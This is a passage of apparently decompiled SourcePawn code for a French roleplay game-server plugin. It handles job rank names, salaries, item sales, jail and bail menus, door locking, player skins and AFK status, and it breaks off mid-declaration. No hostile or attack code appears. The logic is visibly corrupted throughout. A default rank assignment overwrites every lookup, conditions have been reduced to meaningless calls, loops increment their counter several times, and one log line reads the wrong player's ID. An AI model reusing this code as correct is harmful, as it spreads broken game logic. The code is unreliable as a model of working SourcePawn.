				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Patron Banque");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Chef Triade");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Patron BulletClub");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Chef Detectives");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Patron Epicerie");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Chef Arnaqueur");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Patron CarShop");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Barman");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Directeur immo");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 2:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Gardien");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Aide-Soignant");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Serveur");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "A. Avocat");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "A. Tueur");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "A. Grenadier");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "A. Mafieux");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "RVDR. de Drogue");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "V. Recharge AC");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "A. Entraineur");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Buraliste");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Cons. Financier");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "A. Gangsters");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "A.V. de Permis");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Apprenti Detective");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "A.V. de Glaces");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Bidouilleur");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "A. Garagiste");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Videur");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "A.V. Immo");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 3:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent C.I.A");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Urgentiste");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Pizzayolo");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Juge");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Tueur d'Elite");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Armurier");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Consigliere");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Passeur de Drogue");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Ingenieur AC.");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Coach de Def.");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Huissier Loto");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Preteur s/Gage");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Bras D. Triade");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Moniteur de Tir");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Enqueteur");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Epicier");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Arnaqueur Pro");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "V. de Voitures");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Serveur");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "V. Immo Exp");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 4:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent du F.B.I");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Medecin");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Cuisinier");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "A. Juge");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Tueur Exp.");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "A. Armurier");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Caporegime");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Dealer");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "V. AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Coach Sportif");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Vendeur de Ticket");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Banquier");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Pirate Inform.");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "A. Moniteur");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Apprenti Enqueteur");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Apprenti Epicier");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Arnaqueur Pro");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "A.V. de Voitures");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "DiscJockey");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "V. Immo Senior");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 5:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent de police");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Infirmier");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "V. Pizza");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Avocat");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Tueur Debutant");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "V. de Grenades");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Mafieux");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Apprenti Dealer");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "A. Vendeur AC");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Entraineur");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "A. V. de Ticket");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Apprenti Banquier");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Gangsters");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "V. de permis");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Detective");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "V. de Glaces");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Arnaqueur");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Garagiste");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Call Girl");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "V. Immo");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 6:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent G.T.I");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Co-D. Hopital");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Co-Chef Pizza");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Co-P. Justice");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Co-P. Tueurs");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Co-D. Ammu");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Co-Parrain");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Co-C. Dealers");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Co-P. A-C");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Co-P. Coachs");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Co-P. Loto");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Co-P. Banque");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Co-C. Triade");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Co-P. BulletClub");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Co-C. Detectives");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Co-P. Epicerie");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Co-C. Arnaqueurs");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Co-P. CarShop");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Co-Barman");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Co-D. Immobilier");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		default:
		{
		}
	}
	return 0;
}

GiveHP(client, HP)
{
	if (IsClientConnected(client))
	{
		new ActualHP = GetClientHealth(client);
		new var1;
		if (GetClientTeam(client))
		{
			new FinalHP = HP + ActualHP;
			new var4;
			if (GetClientTeam(client))
			{
				FinalHP = 100;
			}
			new var5;
			if (GetClientTeam(client))
			{
				FinalHP = 500;
			}
			SetEntityHealth(client, FinalHP);
			return 1;
		}
		PrintToChat(client, "[L-RP] Vous avez deja toute votre vie.");
	}
	return 0;
}

SalaryTime()
{
	new i = 1;
	while (GetMaxClients() > i)
	{
		if (IsClientInGame(i))
		{
			if (!AfkMode[i][0][0])
			{
				if (IsPlayerAlive(i))
				{
					if (!IsInJail[i][0][0])
					{
						new CheckCapital = Capital[JobID[i][0][0]][0][0];
						if (JobID[i][0][0])
						{
							if (0 <= CheckCapital - Salary[i][0][0])
							{
								new var1 = Capital[JobID[i][0][0]];
								var1 = var1[0][0] - Salary[i][0][0];
								if (PlayerHasRIB[i][0][0] == 1)
								{
									new var2 = bank[i];
									var2 = Salary[i][0][0] + var2[0][0];
								}
								else
								{
									new var3 = money[i];
									var3 = Salary[i][0][0] + var3[0][0];
								}
								PrintToChat(i, "[L-RP] Vous avez recu votre paie de %i$.", Salary[i]);
								decl String:SteamID[64];
								GetClientAuthString(i, SteamID, 64);
								LogMessage("%N(%s) a recu sa paye de %i$.", i, SteamID, Salary[i]);
							}
							PrintToChat(i, "[L-RP] Votre entreprise ne possede pas les fonds necessaires pour vous payer.");
						}
						if (JobID[i][0][0])
						{
							i++;
						}
						else
						{
							if (PlayerHasRIB[i][0][0] == 1)
							{
								new var4 = bank[i];
								var4 = Salary[i][0][0] + var4[0][0];
							}
							else
							{
								new var5 = money[i];
								var5 = Salary[i][0][0] + var5[0][0];
							}
							PrintToChat(i, "[L-RP] Vous avez recu votre chomage de %i$.", Salary[i]);
							i++;
						}
						i++;
					}
					else
					{
						PrintToChat(i, "[L-RP] Vous n'avez pas recu votre paye car vous etes en prison.");
						i++;
					}
					i++;
				}
				else
				{
					PrintToChat(i, "[L-RP] Vous n'avez pas recu votre paye car vous etes mort.");
					i++;
				}
				i++;
			}
			PrintToChat(i, "[L-RP] Vous n'avez pas recu votre paye car vous etes absent.");
			i++;
		}
		i++;
	}
	return 0;
}

Sell(client, Player, String:item[], Quantity, Cost, bool:masculin, bool:TempHasCB)
{
	decl result;
	if (TempHasCB)
	{
		result = bank[Player][0][0] - Cost;
	}
	else
	{
		result = money[Player][0][0] - Cost;
	}
	if (0 <= result)
	{
		if (TempHasCB)
		{
			new var1 = bank[Player];
			var1 = var1[0][0] - Cost;
		}
		else
		{
			new var2 = money[Player];
			var2 = var2[0][0] - Cost;
		}
		if (Player != client)
		{
			new var3 = money[client];
			var3 = Cost / 2 + var3[0][0];
		}
		new var4 = Capital[JobID[client][0][0]];
		var4 = Cost / 2 + var4[0][0];
		if (masculin)
		{
			PrintToChat(Player, "[L-RP] Vous avez acheter un %s (Quantite: %i) a %N pour %i$", item, Quantity, client, Cost);
			if (Player != client)
			{
				PrintToChat(client, "[L-RP] Vous avez vendu un %s (Quantite: %i) a %N pour %i$", item, Quantity, Player, Cost);
			}
		}
		else
		{
			PrintToChat(Player, "[L-RP] Vous avez acheter une %s (Quantite: %i) a %N pour %i$", item, Quantity, client, Cost);
			if (Player != client)
			{
				PrintToChat(client, "[L-RP] Vous avez vendu une %s (Quantite: %i) a %N pour %i$", item, Quantity, Player, Cost);
			}
		}
		decl String:SteamID[64];
		decl String:SteamID2[64];
		GetClientAuthString(client, SteamID, 64);
		GetClientAuthString(client, SteamID2, 64);
		LogMessage("%N(%s) a vendu un %s (Quantite: %i) a %N(%s) pour %i$.", client, SteamID, item, Quantity, Player, SteamID2, Cost);
		return 1;
	}
	if (Player != client)
	{
		PrintToChat(client, "[L-RP] %N n'as pas assez d'argent pour finaliser la transaction.", Player);
	}
	PrintToChat(Player, "[L-RP] Vous n'avez pas l'argent necessaire pour finaliser la transaction.");
	return 0;
}

SetThirdPerson(client)
{
	if (IsClientInGame(client))
	{
		SetEntPropEnt(client, PropType:0, "m_hObserverTarget", 0, 0);
		SetEntProp(client, PropType:0, "m_iObserverMode", any:1, 4, 0);
		SetEntProp(client, PropType:0, "m_bDrawViewmodel", any:0, 4, 0);
	}
	return 0;
}

SetFirstPerson(client)
{
	if (IsClientInGame(client))
	{
		SetEntPropEnt(client, PropType:0, "m_hObserverTarget", 1, 0);
		SetEntProp(client, PropType:0, "m_iObserverMode", any:0, 4, 0);
		SetEntProp(client, PropType:0, "m_bDrawViewmodel", any:1, 4, 0);
	}
	return 0;
}

Jail(Player, Cop, Time, Amende)
{
	decl String:ItemAccepter[32];
	decl String:ItemRefuser[32];
	if (IsClientInGame(Player))
	{
		new var1;
		if (JailTime[Player][0][0] < Time)
		{
			JailTime[Player] = Time;
			new Handle:caution_menu = CreateMenu(Menu_Caution, MenuAction:28);
			SetMenuTitle(caution_menu, "Votre caution s'eleve a %i$. Voulez-vous la payer?", Amende);
			Format(ItemAccepter, 32, "%i_%i_%i_a", Cop, Time, Amende);
			AddMenuItem(caution_menu, ItemAccepter, "Accepter de payer la caution.", 0);
			Format(ItemRefuser, 32, "%i_%i_%i_r", Cop, Time, Amende);
			AddMenuItem(caution_menu, ItemRefuser, "Refuser de payer la caution.", 0);
			SetMenuExitButton(caution_menu, false);
			DisplayMenu(caution_menu, Player, 0);
		}
		Client_RemoveAllWeapons(Player, "", false);
		GivePlayerItem(Player, "weapon_knife", 0);
	}
	return 0;
}

public Menu_Caution(Handle:caution_menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		new Cop = 0;
		new Time = 0;
		new Amende = 0;
		decl String:info[32];
		GetMenuItem(caution_menu, param2, info, 32, 0, "", 0);
		decl String:Buffer[16][32];
		ExplodeString(info, "_", Buffer, 4, 32, false);
		Cop = StringToInt(Buffer[0][Buffer], 10);
		Time = StringToInt(Buffer[1], 10);
		Amende = StringToInt(Buffer[2], 10);
		if (StrEqual(Buffer[3], "a", true))
		{
			new total = money[param1][0][0] - Amende;
			new totalbank = bank[param1][0][0] - Amende;
			if (0 <= total)
			{
				new var1 = money[param1];
				var1 = var1[0][0] - Amende;
				new var2 = money[Cop];
				var2 = Amende / 2 + var2[0][0];
				new var3 = Capital[1];
				var3 = Amende / 2 + var3[0];
				JailTime[param1] = Time / 2;
				if (JailTime[param1][0][0] <= 120)
				{
					PrintToChat(param1, "[L-RP] Vous avez payer une amande de %i$. Vous etes automatiquement libere.", Amende);
					PrintToChat(Cop, "[L-RP] %N a payer une amande de %i, il est automatiquement libere.", param1, Amende);
					FreePlayer(param1);
					JailTime[param1] = 0;
				}
				else
				{
					PrintToChat(param1, "[L-RP] Vous avez payer une amande de %i$. Vous ne purgerez que la moitie de votre peine.", Amende);
					PrintToChat(Cop, "[L-RP] %N a payer une amande de %i, il ne purgera donc que la moitie de sa peine.", param1, Amende);
				}
			}
			else
			{
				if (0 <= totalbank)
				{
					new var4 = bank[param1];
					var4 = var4[0][0] - Amende;
					new var5 = money[Cop];
					var5 = Amende / 2 + var5[0][0];
					new var6 = Capital[1];
					var6 = Amende / 2 + var6[0];
					JailTime[param1] = Time / 2;
					if (JailTime[param1][0][0] <= 120)
					{
						PrintToChat(param1, "[L-RP] Vous avez payer une amande de %i$. Vous etes automatiquement libere.", Amende);
						PrintToChat(Cop, "[L-RP] %N a payer une amande de %i, il est automatiquement libere.", param1, Amende);
						FreePlayer(param1);
						JailTime[param1] = 0;
					}
					else
					{
						PrintToChat(param1, "[L-RP] Vous avez payer une amande de %i$. Vous ne purgerez que la moitie de votre peine.", Amende);
						PrintToChat(Cop, "[L-RP] %N a payer une amande de %i, il ne purgera donc que la moitie de sa peine.", param1, Amende);
					}
				}
				JailTime[param1] = Time;
			}
		}
		if (StrEqual(Buffer[3], "r", true))
		{
			PrintToChat(param1, "[L-RP] Vous avez refuse de payer votre caution, votre peine reste inchangee.");
			PrintToChat(Cop, "[L-RP] %N a refuse de payer sa caution.", param1);
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(caution_menu);
		}
	}
	return 0;
}

GetTargetName(entity, String:buf[], len)
{
	GetEntPropString(entity, PropType:1, "m_iName", buf, len, 0);
	return 0;
}

EyeFix(client)
{
	new players = 1;
	while (players <= MaxClients)
	{
		new var1;
		if (IsClientInGame(players))
		{
			if (client != players)
			{
				new vehicle = GetEntPropEnt(players, PropType:0, "m_hVehicle", 0);
				if (vehicle != -1)
				{
					decl Float:VehicleAng[3];
					GetEntPropVector(vehicle, PropType:1, "m_angRotation", VehicleAng, 0);
					SubtractVectors(CurrentEyeAngle[players][0][0], VehicleAng, CurrentEyeAngle[players][0][0]);
				}
				TeleportEntity(players, NULL_VECTOR, CurrentEyeAngle[players][0][0], NULL_VECTOR);
				players++;
			}
			players++;
		}
		players++;
	}
	return 0;
}

public Action:OnBulletImpact(Handle:event, String:name[], bool:dontBroadcast)
{
	new client = GetClientOfUserId(GetEventInt(event, "userid"));
	decl String:WeaponName[128];
	Client_GetActiveWeaponName(client, WeaponName, 128);
	decl Float:pos[3];
	pos[0] = GetEventFloat(event, "x");
	pos[1] = GetEventFloat(event, "y");
	pos[2] = GetEventFloat(event, "z");
	new var1;
	if (ColorBallCount[client][0][0] > 0)
	{
		new var2 = ColorBallCount[client];
		var2 = var2[0][0] + -1;
		TE_SetupWorldDecal(pos, BallColor[GetRandomInt(0, 16)][0][0]);
		TE_SendToAll(0);
	}
	return Action:0;
}

TE_SetupWorldDecal(Float:vecOrigin[3], index)
{
	TE_Start("World Decal");
	TE_WriteVector("m_vecOrigin", vecOrigin);
	TE_WriteNum("m_nIndex", index);
	return 0;
}

TeleportToJail(client)
{
	new random_cell = GetRandomInt(0, g_CellQty);
	TeleportEntity(client, g_CellLoc[random_cell][0][0], NULL_VECTOR, NULL_VECTOR);
	return 0;
}

ModifySpeed(client, speed, Float:duration)
{
	new var1;
	if (IsClientInGame(client))
	{
		SetEntPropFloat(client, PropType:1, "m_flLaggedMovementValue", speed, 0);
		if (duration > 0)
		{
			CreateTimer(duration, ResetSpeed, client, 0);
		}
	}
	return 0;
}

ModifyGravity(client, grav, Float:duration)
{
	new var1;
	if (IsClientInGame(client))
	{
		SetEntityGravity(client, grav);
		if (duration > 0)
		{
			CreateTimer(duration, ResetGrav, client, 0);
		}
	}
	return 0;
}

FreePlayer(client)
{
	if (IsClientInGame(client))
	{
		JailTime[client] = 0;
		new spawn_here = GetRandomInt(0, g_SpawnQtyT);
		TeleportEntity(client, g_SpawnLocT[spawn_here][0][0], NULL_VECTOR, NULL_VECTOR);
		PrintToChat(client, "[L-RP] Vous avez ete liberer de prison.");
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		LogMessage("%N(%s) a ete libere de prison.", client, SteamID);
	}
	return 0;
}

LockDoor(client, Ent, bool:say)
{
	if (Ent != -1)
	{
		if (Entity_IsLocked(Ent))
		{
			if (say)
			{
				PrintToChat(client, "[L-RP] Cette porte est deja fermee.");
			}
		}
		AcceptEntityInput(Ent, "Lock", client, -1, 0);
		EmitSoundToClient(client, "doors/default_locked.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
		if (say)
		{
			PrintToChat(client, "[L-RP] Vous avez verrouille la porte.");
		}
	}
	return 0;
}

UnlockDoor(client, Ent, bool:say)
{
	if (Ent != -1)
	{
		if (Entity_IsLocked(Ent))
		{
			AcceptEntityInput(Ent, "Unlock", client, -1, 0);
			EmitSoundToClient(client, "doors/latchunlocked1.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
			if (say)
			{
				PrintToChat(client, "[L-RP] Vous avez deverrouille la porte.");
			}
		}
		if (say)
		{
			PrintToChat(client, "[L-RP] Cette porte est deja ouverte.");
		}
	}
	return 0;
}

SwitchTeam(client, team)
{
	CS_SwitchTeam(client, team);
	if (Skin[client][0][0])
	{
		switch (Skin[client][0][0])
		{
			case 1:
			{
				SetEntityModel(client, "models/player/slow/me2/illusive_man/slow.mdl");
			}
			default:
			{
			}
		}
	}
	else
	{
		new random = GetRandomInt(0, g_SkinQtyT);
		new var1;
		if (JobID[client][0][0] == 1)
		{
			if (RankID[client][0][0] == 1)
			{
				new var3 = CTModels;
				SetEntityModel(client, var3[0][0][var3]);
			}
			else
			{
				if (RankID[client][0][0] == 3)
				{
					SetEntityModel(client, CTModels[1][0]);
				}
				if (RankID[client][0][0] == 4)
				{
					SetEntityModel(client, CTModels[2][0]);
				}
				if (RankID[client][0][0] == 6)
				{
					SetEntityModel(client, CTModels[4][0]);
				}
				SetEntityModel(client, CTModels[3][0]);
			}
		}
		else
		{
			if (JobID[client][0][0] == 2)
			{
				SetEntityModel(client, "models/player/slow/hl2/medic_male/slow.mdl");
			}
			new var2;
			if (JobID[client][0][0] == 19)
			{
				SetEntityModel(client, "models/player/hhp227/bunnygirl/bunnygirl.mdl");
			}
			SetEntityModel(client, CitoyenModels[random][0][0]);
		}
	}
	return 0;
}

public Float:entity_distance_stock(ent1, ent2)
{
	decl Float:orig1[3];
	decl Float:orig2[3];
	GetEntPropVector(ent1, PropType:0, "m_vecOrigin", orig1, 0);
	GetEntPropVector(ent2, PropType:0, "m_vecOrigin", orig2, 0);
	return GetVectorDistance(orig1, orig2, false);
}

bool:SetClientName(client, String:name[])
{
	decl String:oldname[32];
	if (!GetClientName(client, oldname, 32))
	{
		return false;
	}
	SetClientInfo(client, "name", name);
	SetEntPropString(client, PropType:1, "m_szNetname", name);
	new Handle:event = CreateEvent("player_changename", false);
	if (event)
	{
		SetEventInt(event, "userid", GetClientUserId(client));
		SetEventString(event, "oldname", oldname);
		SetEventString(event, "newname", name);
		FireEvent(event, false);
		new Handle:msg = StartMessageAll("SayText2", 0);
		if (msg)
		{
			BfWriteByte(msg, client);
			BfWriteByte(msg, 1);
			BfWriteString(msg, "Cstrike_Name_Change");
			BfWriteString(msg, oldname);
			BfWriteString(msg, name);
			EndMessage();
			return true;
		}
	}
	return false;
}

IsCarSpawned(car)
{
	new realMaxEntities = GetMaxEntities();
	decl String:Classname[64];
	new i = 0;
	while (i <= realMaxEntities)
	{
		if (IsValidEntity(i))
		{
			GetEdictClassname(i, Classname, 64);
			if (StrEqual(Classname, "prop_vehicle_driveable", true))
			{
				if (car == i)
				{
					return 1;
				}
				i++;
			}
			i++;
		}
		i++;
	}
	return 0;
}

Respawn_Player(client)
{
	if (client)
	{
		if (!IsPlayerAlive(client))
		{
			CS_RespawnPlayer(client);
			Client_RemoveAllWeapons(client, "", false);
			GivePlayerItem(client, "weapon_knife", 0);
			SetEntityRenderColor(client, 255, 255, 255, 255);
			ClientCommand(client, "r_screenoverlay 0");
			if (JobID[client][0][0] == 1)
			{
				new spawn_here = GetRandomInt(0, g_SpawnQtyCT);
				TeleportEntity(client, g_SpawnLocCT[spawn_here][0][0], NULL_VECTOR, NULL_VECTOR);
			}
			else
			{
				if (0 < JailTime[client][0][0])
				{
					TeleportToJail(client);
				}
				new spawn_here = GetRandomInt(0, g_SpawnQtyT);
				TeleportEntity(client, g_SpawnLocT[spawn_here][0][0], NULL_VECTOR, NULL_VECTOR);
			}
			PrintToChat(client, "[L-RP] Vous avez ete reanimer.");
		}
	}
	return 0;
}

CleanUpCarID(CarID)
{
	new i = 1;
	while (i < MaxClients)
	{
		if (IsClientConnected(i))
		{
			if (CarImpala[i][0][0] == CarID)
			{
				CarImpala[i] = 0;
			}
			if (CarPoliceImpala[i][0][0] == CarID)
			{
				CarPoliceImpala[i] = 0;
			}
			if (CarMustang[i][0][0] == CarID)
			{
				CarMustang[i] = 0;
			}
			if (CarTacoma[i][0][0] == CarID)
			{
				CarTacoma[i] = 0;
			}
			if (CarMustangGT[i][0][0] == CarID)
			{
				CarMustangGT[i] = 0;
			}
			if (CarDirtBike[i][0][0] == CarID)
			{
				CarDirtBike[i] = 0;
			}
			if (CarFordGT[i][0][0] == CarID)
			{
				CarFordGT[i] = 0;
				i++;
			}
			i++;
		}
		i++;
	}
	return 0;
}

Afk(client)
{
	decl String:AfkName[64];
	decl String:Name[64];
	if (!AfkMode[client][0][0])
	{
		AfkMode[client] = 1;
		PrintToChatAll("%N est maintenant absent.", client);
		PrintToChat(client, "Vous etes maintenant absent.");
		GetClientName(client, Name, 64);
		Format(AfkName, 64, "<AFK>%s", Name);
		SetClientName(client, AfkName);
	}
	else
	{
		AfkMode[client] = 0;
		PrintToChatAll("%N n'est plus absent.", client);
		PrintToChat(client, "Vous n'etes plus absent.");
		GetClientName(client, Name, 64);
		ReplaceString(Name, 64, "<AFK>", "", true);
		SetClientName(client, Name);
	}
	return 0;
}

public Action:CreateBeam(client)
{
	decl Float:f_playerViewOrigin[3];
	GetClientAbsOrigin(client, f_playerViewOrigin);
	if (GetClientButtons(client) & 4)
	{
		f_playerViewOrigin[2] += 40;
	}
	else
	{
		f_playerViewOrigin[2] += 60;
	}
	decl Float:f_playerViewDestination[3];
	GetPlayerEye(client, f_playerViewDestination);
	new Float:distance = GetVectorDistance(f_playerViewOrigin, f_playerViewDestination, false);
	new Float:percentage = 0.4 / distance / 100;
	decl Float:f_newPlayerViewOrigin[3];
	f_newPlayerViewOrigin[0] = f_playerViewOrigin[0] + f_playerViewDestination[0] - f_playerViewOrigin[0] * percentage;
	f_newPlayerViewOrigin[1] = f_playerViewOrigin[1] + f_playerViewDestination[1] - f_playerViewOrigin[1] * percentage - 0.08;
	f_newPlayerViewOrigin[2] = f_playerViewOrigin[2] + f_playerViewDestination[2] - f_playerViewOrigin[2] * percentage;
	decl color[4];
	color[0] = 200;
	color[1] = 0;
	color[2] = 0;
	color[3] = 17;
	new Float:life = 0.1;
	TE_SetupBeamPoints(f_newPlayerViewOrigin, f_playerViewDestination, g_BeamSprite, 0, 0, 0, life, 1039516303, 0, 1, 0, color, 0);
	TE_SendToAll(0);
	TE_SetupGlowSprite(f_playerViewDestination, g_glow, life, 1048576000, color[3]);
	TE_SendToAll(0);
	return Action:0;
}

bool:GetPlayerEye(client, Float:pos[3])
{
	decl Float:vAngles[3];
	decl Float:vOrigin[3];
	GetClientEyePosition(client, vOrigin);
	GetClientEyeAngles(client, vAngles);
	new Handle:trace = TR_TraceRayFilterEx(vOrigin, vAngles, 1174421507, RayType:1, TraceEntityFilterPlayer, any:0);
	if (TR_DidHit(trace))
	{
		TR_GetEndPosition(pos, trace);
		CloseHandle(trace);
		return true;
	}
	CloseHandle(trace);
	return false;
}

public bool:TraceEntityFilterPlayer(entity, contentsMask)
{
	return entity > GetMaxClients();
}

LightCreate(Float:pos[3])
{
	new iEntity = CreateEntityByName("light_dynamic", -1);
	DispatchKeyValue(iEntity, "inner_cone", "0");
	DispatchKeyValue(iEntity, "cone", "80");
	DispatchKeyValue(iEntity, "brightness", "1");
	DispatchKeyValueFloat(iEntity, "spotlight_radius", 150);
	DispatchKeyValue(iEntity, "pitch", "90");
	DispatchKeyValue(iEntity, "style", "1");
	DispatchKeyValue(iEntity, "_light", "75 75 255 255");
	DispatchKeyValueFloat(iEntity, "distance", 600);
	EmitSoundToAll("ui/freeze_cam.wav", iEntity, 1, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
	CreateTimer(0.2, Delete, iEntity, 2);
	DispatchSpawn(iEntity);
	TeleportEntity(iEntity, pos, NULL_VECTOR, NULL_VECTOR);
	AcceptEntityInput(iEntity, "TurnOn", -1, -1, 0);
	return 0;
}

public Client_ResetAmmo(client)
{
	new zomg = GetEntDataEnt2(client, activeOffset);
	new var1;
	if (clip1Offset != -1)
	{
		SetEntData(zomg, clip1Offset, any:200, 4, true);
	}
	new var2;
	if (clip2Offset != -1)
	{
		SetEntData(zomg, clip2Offset, any:200, 4, true);
	}
	new var3;
	if (priAmmoTypeOffset != -1)
	{
		SetEntData(zomg, priAmmoTypeOffset, any:200, 4, true);
	}
	new var4;
	if (secAmmoTypeOffset != -1)
	{
		SetEntData(zomg, secAmmoTypeOffset, any:200, 4, true);
	}
	return 0;
}

Call(Client, Player)
